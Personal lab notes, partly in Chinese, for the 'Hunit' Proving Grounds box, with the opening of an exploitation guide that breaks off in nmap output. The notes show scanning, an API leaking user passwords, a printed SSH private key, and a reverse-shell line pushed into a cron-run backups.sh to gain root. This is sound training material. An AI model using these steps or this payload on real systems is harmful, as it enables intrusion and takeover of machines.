## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ sudo nmap -A -sC -T4 192.168.202.125 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-05 22:11 CST
Nmap scan report for 192.168.202.125
Host is up (0.34s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Tue, 05 Sep 2023 14:12:01 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 05 Sep 2023 14:12:02 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Tue, 05 Sep 2023 14:12:02 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|_    HTTP Version Not Supported</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: My Haikus
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=9/5%Time=64F73731%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r
SF:\nDate:\x20Tue,\x2005\x20Sep\x202023\x2014:12:01\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x
SF:20UP\n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\
SF:x20commercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(htm
SF:l5up\.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</ti
SF:tle>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewpor
SF:t\"\x20content=\"width=device-width,\x20initial-scale=1,\x20user-scalab
SF:le=no\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css
SF:\"\x20/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t
SF:\t<!--\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">
SF:\n\t\t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"r
SF:ow\">\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<head
SF:er\x20id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"lo
SF:go\">My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t
SF:</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\
SF:n\n\t\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTT
SF:POptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nCont
SF:ent-Length:\x200\r\nDate:\x20Tue,\x2005\x20Sep\x202023\x2014:12:02\x20G
SF:MT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x2050
SF:5\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\
SF:x20en\r\nContent-Length:\x20465\r\nDate:\x20Tue,\x2005\x20Sep\x202023\x
SF:2014:12:02\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><
SF:title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x
SF:20Supported</title><style\x20type=\"text/css\">body\x20{font-family:Tah
SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
SF:}</style></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP
SF:\x20Version\x20Not\x20Supported</h1></body></html>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   368.16 ms 192.168.45.1
2   368.14 ms 192.168.45.254
3   368.34 ms 192.168.251.1
4   368.32 ms 192.168.202.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.57 seconds
```


```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ sudo nmap -p- -sS -sV 192.168.202.125 -vvv
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-05 23:02 CST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 23:02
Scanning 192.168.202.125 [4 ports]
Completed Ping Scan at 23:02, 0.41s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:02
Completed Parallel DNS resolution of 1 host. at 23:02, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:02
Scanning 192.168.202.125 [65535 ports]
Discovered open port 8080/tcp on 192.168.202.125
SYN Stealth Scan Timing: About 1.58% done; ETC: 23:35 (0:32:06 remaining)
Discovered open port 43022/tcp on 192.168.202.125
SYN Stealth Scan Timing: About 4.81% done; ETC: 23:24 (0:20:07 remaining)
SYN Stealth Scan Timing: About 10.99% done; ETC: 23:16 (0:12:17 remaining)
SYN Stealth Scan Timing: About 18.27% done; ETC: 23:13 (0:09:01 remaining)
SYN Stealth Scan Timing: About 20.76% done; ETC: 23:15 (0:09:36 remaining)
SYN Stealth Scan Timing: About 22.07% done; ETC: 23:16 (0:10:39 remaining)
SYN Stealth Scan Timing: About 23.60% done; ETC: 23:17 (0:11:23 remaining)
SYN Stealth Scan Timing: About 31.82% done; ETC: 23:18 (0:10:26 remaining)
Discovered open port 12445/tcp on 192.168.202.125
SYN Stealth Scan Timing: About 39.62% done; ETC: 23:16 (0:08:11 remaining)
SYN Stealth Scan Timing: About 43.98% done; ETC: 23:16 (0:07:28 remaining)
Discovered open port 18030/tcp on 192.168.202.125
SYN Stealth Scan Timing: About 48.38% done; ETC: 23:16 (0:06:48 remaining)
SYN Stealth Scan Timing: About 55.51% done; ETC: 23:15 (0:05:30 remaining)
SYN Stealth Scan Timing: About 63.81% done; ETC: 23:14 (0:04:11 remaining)
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ sudo nmap -A -sC -T4 192.168.202.125 -p 8080,43022,12445,18030
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-05 23:12 CST
Nmap scan report for 192.168.202.125
Host is up (0.27s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Tue, 05 Sep 2023 15:12:37 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 05 Sep 2023 15:12:37 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Tue, 05 Sep 2023 15:12:38 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=9/5%Time=64F74564%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r
SF:\nDate:\x20Tue,\x2005\x20Sep\x202023\x2015:12:37\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x
SF:20UP\n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\
SF:x20commercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(htm
SF:l5up\.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</ti
SF:tle>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewpor
SF:t\"\x20content=\"width=device-width,\x20initial-scale=1,\x20user-scalab
SF:le=no\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css
SF:\"\x20/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t
SF:\t<!--\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">
SF:\n\t\t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"r
SF:ow\">\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<head
SF:er\x20id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"lo
SF:go\">My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t
SF:</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\
SF:n\n\t\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTT
SF:POptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nCont
SF:ent-Length:\x200\r\nDate:\x20Tue,\x2005\x20Sep\x202023\x2015:12:37\x20G
SF:MT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x2050
SF:5\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\
SF:x20en\r\nContent-Length:\x20465\r\nDate:\x20Tue,\x2005\x20Sep\x202023\x
SF:2015:12:38\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><
SF:title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x
SF:20Supported</title><style\x20type=\"text/css\">body\x20{font-family:Tah
SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
SF:}</style></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP
SF:\x20Version\x20Not\x20Supported</h1></body></html>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   265.66 ms 192.168.45.1
2   265.53 ms 192.168.45.254
3   265.70 ms 192.168.251.1
4   266.06 ms 192.168.202.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.66 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ dirsearch -u http://192.168.202.125:8080/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.202.125-8080/-_23-09-05_22-14-05.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-05_22-14-05.log

Target: http://192.168.202.125:8080/

[22:14:06] Starting:
[22:15:01] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[22:15:06] 400 -  435B  - /a%5c.aspx
[22:16:14] 200 -  148B  - /api/
[22:16:55] 500 -  105B  - /error
[22:16:55] 500 -  105B  - /error/
```

```json
http://192.168.202.125:8080/api/
```

![[截圖 2023-09-05 下午11.07.34.png]]

訪問 [http://192.168.202.125:8080/api/](http://192.168.202.125:8080/api/)


![[截圖 2023-09-05 下午11.07.49.png]]

看到 dademola 的 description 是 admin，嘗試用他密碼登入 port 43022 ssh

```json
0	
login	"rjackson"
password	"yYJcgYqszv4aGQ"
firstname	"Richard"
lastname	"Jackson"
description	"Editor"
id	1
1	
login	"jsanchez"
password	"d52cQ1BzyNQycg"
firstname	"Jennifer"
lastname	"Sanchez"
description	"Editor"
id	3
2	
login	"dademola"
password	"ExplainSlowQuest110"
firstname	"Derik"
lastname	"Ademola"
description	"Admin"
id	6
3	
login	"jwinters"
password	"KTuGcSW6Zxwd0Q"
firstname	"Julie"
lastname	"Winters"
description	"Editor"
id	7
4	
login	"jvargas"
password	"OuQ96hcgiM5o9w"
firstname	"James"
lastname	"Vargas"
description	"Editor"
id	10
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ ssh dademola@192.168.202.125 -p 43022
The authenticity of host '[192.168.202.125]:43022 ([192.168.202.125]:43022)' can't be established.
RSA key fingerprint is SHA256:z0nRSNfWm8lW8TAD7IqU8sI27jz3bramIDtsgmidCPQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.202.125]:43022' (RSA) to the list of known hosts.
dademola@192.168.202.125's password:
[dademola@hunit ~]$ whoami && ifconfig
dademola
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.202.125  netmask 255.255.255.0  broadcast 192.168.202.255
        inet6 fe80::250:56ff:feba:5582  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:55:82  txqueuelen 1000  (Ethernet)
        RX packets 439665  bytes 35975035 (34.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 111115  bytes 25353092 (24.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 600 (600.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 600 (600.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

get shell!

Linpeas 發現有 cronjob

```json
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Sep  5 15:15 cron.daily
-rw------- 1 root root    9 Feb 16  2023 cron.monthly
-rw------- 1 root root    9 Feb 16  2023 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

還有 git ssh key

```json
╔══════════╣ Analyzing SSH Files (limit 70)

-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtvi+/zIFPzCfn2CBFxGtflgPf6jLxY9ZFEwZNHbQjg32p3cWbzQG
wRWNSVlBYzj6sXPjcWTRc7p08WHb9/85L0/f94lfXUIB9ptipL9EHxSUDxGroP60H9jJTj
0Kuety1G+xSyti++Qji6hxmuRrQ4e5Q6lBn84/CXAnRH6GLYFRywJEXQtLHCwtlhVEqP7H
ZAWLtDFnWQV7eMF9RCNBVSWBbeQITbZDSbctg5P0H35ioPu67Pygo9SfSRXpBPVBI13feB
II2V3iL+BQy6seCj7tHj9pNYZFWjroKVCBZkoLfLsTHRkXDKLRICvcHw1yOWUf4sFNnXkc
lHCxsEU6dJD9k7hwnK1Es+QglXQSS0JOmPwTfpRkrX1d27K31roQP/YGVbZJEi3stAmaZ3
iQ1cQMy2NQ6ESoupNdQeVFy0E4cpp/NDyazh/vt2irc6fUN+jdFvCWZbIO6pml+HWOU3U3
AxFTSXmbrjMHahArxMq/JtUwJauyw09FKtycEO3zAAAFgJYa8VCWGvFQAAAAB3NzaC1yc2
EAAAGBALb4vv8yBT8wn59ggRcRrX5YD3+oy8WPWRRMGTR20I4N9qd3Fm80BsEVjUlZQWM4
+rFz43Fk0XO6dPFh2/f/OS9P3/eJX11CAfabYqS/RB8UlA8Rq6D+tB/YyU49CrnrctRvsU
srYvvkI4uocZrka0OHuUOpQZ/OPwlwJ0R+hi2BUcsCRF0LSxwsLZYVRKj+x2QFi7QxZ1kF
e3jBfUQjQVUlgW3kCE22Q0m3LYOT9B9+YqD7uuz8oKPUn0kV6QT1QSNd33gSCNld4i/gUM
urHgo+7R4/aTWGRVo66ClQgWZKC3y7Ex0ZFwyi0SAr3B8NcjllH+LBTZ15HJRwsbBFOnSQ
/ZO4cJytRLPkIJV0EktCTpj8E36UZK19Xduyt9a6ED/2BlW2SRIt7LQJmmd4kNXEDMtjUO
hEqLqTXUHlRctBOHKafzQ8ms4f77doq3On1Dfo3RbwlmWyDuqZpfh1jlN1NwMRU0l5m64z
B2oQK8TKvybVMCWrssNPRSrcnBDt8wAAAAMBAAEAAAGAL2RonFMJdt+SSMbHSQFkLbiDcy
52cVp62T4IvUUVKeZGAARhhDY2laaObPQ4concrT/2JnXVpqMiDS+quSabWjzXJxem4tHp
DkYbG88Kxv4eh3StPssaPrF5GtHGyHdKy+mOQ4keX14tMsxTeKo3ektaWkMp40mZnEk3co
9PE9ROKkYRDQSS1N5AhIJHwXoUjTy+fdLaEP3RiGqdlpuHHZXUW3FYEUDnVt2iZVVaQxoK
U+Y/+YhJ14WIKHcLXyRi5YG5YGwsVQl3M0Ji+spIs5p6Xr2+Jwak9Zd6laBJt4Dt2/tt9C
eF0ohAr89b4Kkg2tLQ8yphogyP/yZJiOElOcjf3e2CRWrjEVwXmt98EXHUlkf0cj7gcZBa
Ao5Pp/gxGX3wgVSguE1oTTcDa1Cnxu2fpLF1BscVQ3IuugnzMBljKkS0sGHGny1ujSNGE9
L3/jbS0DQBQHwz37S6M2C3W2A4tqmbUcX4xdUHG8kXn1LvybJpbGsTT7eZ3l/NDgBRAAAA
wQCMOvhEi8kvk4uNYJhHSCDdDZ4Hpso0/wQXbJu1SX2ZKkSc0DGJ4MiK5QftbG5g/OQs7g
lV9oteMuOly+WpFWbQYiAhKac7WcFdzJrR3qPALF8Ki5qyZnthibVZ5H98ndbdPCYLu+Le
jJ9w0usWvK2QF/CjGAALuL4ryAPNGCXRx1a2N6AKvfnm/8xb+4cY/3HMpJCGOqwcvQEk+t
PW3F9DqQgp02tkchiljjGI7NEJiYjwfR4spIPK6/DUy4HzkPAAAADBAOYN7bVwgbxc73Xr
NA9r4aSyqvVAQncSXy3sfUimnVKnoNprNlD0GI65YBO3WOQ1tq3MBDloAX9ZD1LDBRp7NL
ZfExqUxBBtTqOdvo8BLNPOvHGdTEGycu74+yPb+CnjqymkrcA7J81rcNM2CjnL9MBFM9R+
DkWUnDMsGg/3JDpNBKhT1kxEHr5UXcX7Ho8bkf0+qUBNagx0j9GuYg74NqaQ1LlBTMR4Ty
jn4T932jkf8EGo/oPhuN86FsOv3hlEeQAAAMEAy5t06uOSOY4aTZd0o8v249k7dfvGWYTG
ZNLEBRIzd1r47LPCkBHXckDNcvHmmSjBSrl9iZkrHSwSFjnL5+UbOCdN3CfRe3o2NuUcaW
yQL0KeFMhCR9tQOFRYDqfEqahd2mKg/7HIYdlaSJBaSf7I4X17SqOKoO/H15E3GMPPdupZ
tX8QOYlpuVHmka5pFsgxgGb0tX36BBIp0M7Dew19niY2DrhsiWte1PwM1Udbibp5xLr6nn
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
```

```json
[dademola@hunit ~]$ git clone file:///git-server/
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
[dademola@hunit ~]$ ls
MEMDUMPS-of-PID-  blog.jar  git-server  linpeas.sh  local.txt  memory-dump.sh  mimipenguin.sh  shared
```

[Writeup](https://medium.com/@blueclps080984/proving-grounds-hunit-intermediate-linux-box-walkthrough-a-journey-to-offensive-security-36081fc196d)

拿到 git account 的 private key，嘗試直接用 GIT_SSH_COMMAND 將 /git-server 拉下來改再 push 回去

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.224.125:/git-server
正複製到 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
接收物件中: 100% (12/12), 完成.
處理 delta 中: 100% (2/2), 完成.

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ git config --global user.name "kali"

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ git config --global user.email "kali@kali.(none)"

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ echo 'sh -i >& /dev/tcp/192.168.45.202/8080 0>&1' >> backups.sh

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ chmod +x backups.sh

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ cat backups.sh
sh -i >& /dev/tcp/192.168.45.202/8080 0>&1

```

接著提交更改

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ git add -A

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ git commit -m "hacked"
[master 491f621] hacked
 1 file changed, 1 insertion(+), 5 deletions(-)

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit/git-server]
└─$ GIT_SSH_COMMAND='ssh -i ~/offensive-security/OSCP/Hunit/id_rsa -p 43022' git push origin master
枚舉物件: 5, 完成.
物件計數中: 100% (5/5), 完成.
使用 2 個執行緒進行壓縮
壓縮物件中: 100% (2/2), 完成.
寫入物件中: 100% (3/3), 277 位元組 | 277.00 KiB/s, 完成.
總共 3 (差異 1)，復用 0 (差異 0)，重用包 0
To 192.168.224.125:/git-server
   b50f4e5..491f621  master -> master
```

接著等待即可，每 3~5 分鐘會被執行一次

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hunit]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.224.125] 37816
sh: cannot set terminal process group (628): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# whoami && ifconfig
whoami && ifconfig
root
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.224.125  netmask 255.255.255.0  broadcast 192.168.224.255
        inet6 fe80::250:56ff:feba:719d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:71:9d  txqueuelen 1000  (Ethernet)
        RX packets 95  bytes 13634 (13.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 88  bytes 18313 (17.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2  bytes 100 (100.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 100 (100.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


---


##### WALKTHROUGH

# Exploitation Guide for Hunit

## Summary

In this scenario, we'll enumerate a web application and discover an API endpoint that leaks user information. This helps us obtain SSH access as a low-privileged user. We'll then find and extract a private SSH key for the `git` user, gaining privileges to push arbitrary updates to the `master` branch of a local repository. To escalate our privileges, we will clone the repository to our attack machine and inject a malicious payload using the `git`account.

## Enumeration

### Nmap

We'll begin with an `nmap` scan against all TCP ports.

```
kali@kali:~$ sudo nmap -p- 192.168.120.204
...
Nmap scan report for 192.168.120.204
PORT      STATE SERVICE
8080/tcp  open  http-proxy
12445/tcp open  unknown
18030/tcp open  unknown
43022/tcp open  unknown
```

Next, we'll run a more detailed "version" scan against the open ports.

```
kali@kali:~$  sudo nmap -sC -sV -p 8080,12445,18030,43022 192.168.120.204
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 16:39 -03
Nmap scan report for 192.168.120.204
Host is up (0.16s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3755
|     Date: Mon, 09 Nov 2020 19:39:31 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
